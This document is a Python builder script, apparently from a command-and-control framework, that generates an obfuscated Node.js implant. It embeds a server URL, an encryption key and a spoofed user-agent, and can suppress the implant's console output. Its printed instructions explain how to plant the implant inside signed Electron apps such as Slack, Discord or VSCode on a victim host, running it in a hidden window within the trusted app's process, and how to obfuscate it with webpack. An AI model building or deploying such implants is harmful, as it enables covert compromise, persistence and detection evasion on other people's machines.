import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import its

from jinja2 import Environment, FileSystemLoader, select_autoescape

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

def add_arguments(parser):
    builder = parser.add_argument_group("Builder options")
    builder.add_argument("--name", default="client.js",
                     help="Name of the output.")
    builder.add_argument("--electron", action="store_true",
                     help="Build for Electron (uses fetch and native WebSocket for proxy awareness).")
    builder.add_argument("--no-print", action="store_true",
                     help="Compile output-suppression into the client (console.* and process.stdout/stderr are redirected to a null sink at startup).")

    cfg = parser.add_argument_group("Client configuration")
    cfg.add_argument("--server-url", default="localhost:8080",
                     help="Server URL the client should connect to.")
    cfg.add_argument("-e", "--encryption-key", default="",
                     help="AES encryption key to embed (optional).")
    cfg.add_argument("--user-agent", default=USER_AGENT,
                     help="Custom HTTP/WebSocket User-Agent string (optional).")
    cfg.add_argument("--proxy", default="",
                     help="Proxy to use (optional).")

    retry = parser.add_argument_group("Retry behavior")
    retry.add_argument("--retry-duration", type=float, default=60.0,
                       help="Total time to retry connecting.")
    retry.add_argument("--retry-attempts", type=int, default=5,
                       help="Number of retry attempts before giving up.")


def build(args):
    template_dir = Path(__file__).resolve().parent / "templates"
    if not template_dir.is_dir():
        raise RuntimeError(f"Template directory not found: {template_dir}")

    env = Environment(
        loader=FileSystemLoader(str(template_dir)),
        autoescape=select_autoescape(enabled_extensions=("j2",)),
        trim_blocks=True,
        lstrip_blocks=True,
    )

    template = env.get_template("client.js")
    rendered = template.render(**vars(args))

    out_path = Path(args.name)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(rendered, encoding="utf-8")
    print(f"[+] Wrote Node.js client to '{out_path}'")

    if args.electron:
        out_dir = out_path.parent

        main_template = env.get_template("electron-main.js")
        main_rendered = main_template.render(**vars(args))
        main_path = out_dir / "main.js"
        main_path.write_text(main_rendered, encoding="utf-8")
        print(f"[+] Wrote Electron main process to '{main_path}'")

        renderer_template = env.get_template("electron-renderer.html")
        renderer_rendered = renderer_template.render(client_name=out_path.name)
        renderer_path = out_dir / "renderer.html"
        renderer_path.write_text(renderer_rendered, encoding="utf-8")
        print(f"[+] Wrote Electron renderer to '{renderer_path}'")

        print()
        print("Next: inject into an existing signed Electron app (Slack, Discord,")
        print("VSCode, or any target you can drop files into on the victim host).")
        print()
        print("    npx asar extract path/to/app.asar unpacked/")
        print("    # open unpacked/package.json and note the \"main\" field --")
        print("    # that's the app's entry point (e.g. main.js, index.js, dist/main.js)")
        print(f"    cp {out_path.name} main.js renderer.html unpacked/")
        print("    # edit the entry point to add:  require('./main.js')")
        print("    npx asar pack unpacked/ app.asar")
        print("    # replace the target's app.asar with this one")
        print()
        print("The injected main.js opens a hidden BrowserWindow that loads")
        print(f"renderer.html, which pulls in {out_path.name} via <script src>. Traffic")
        print("routes through Chromium so OS-level and PAC proxies apply automatically,")
        print("and the client runs inside the signed app's process.")
    else:
        print()
        print("Next: bundle and obfuscate into a single .js.")
        if its.windows:
            print()
            print("    # install Node.js from https://nodejs.org/en/download if needed, then:")
            print("    npx webpack --config webpack.conf.js")
        else:
            print()
            print("    # install nvm + Node if needed:")
            print("    curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash")
            print("    . \"$HOME/.nvm/nvm.sh\" && nvm install --lts")
            print("    npx webpack --config webpack.conf.js")
        print()
        print("The included webpack.conf.js has devtool:false (no source maps) and")
        print("webpack-obfuscator enabled. Output: client.obf.js.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(usage=argparse.SUPPRESS)
    add_arguments(parser)
    parsed_args = parser.parse_args()
    build(parsed_args)
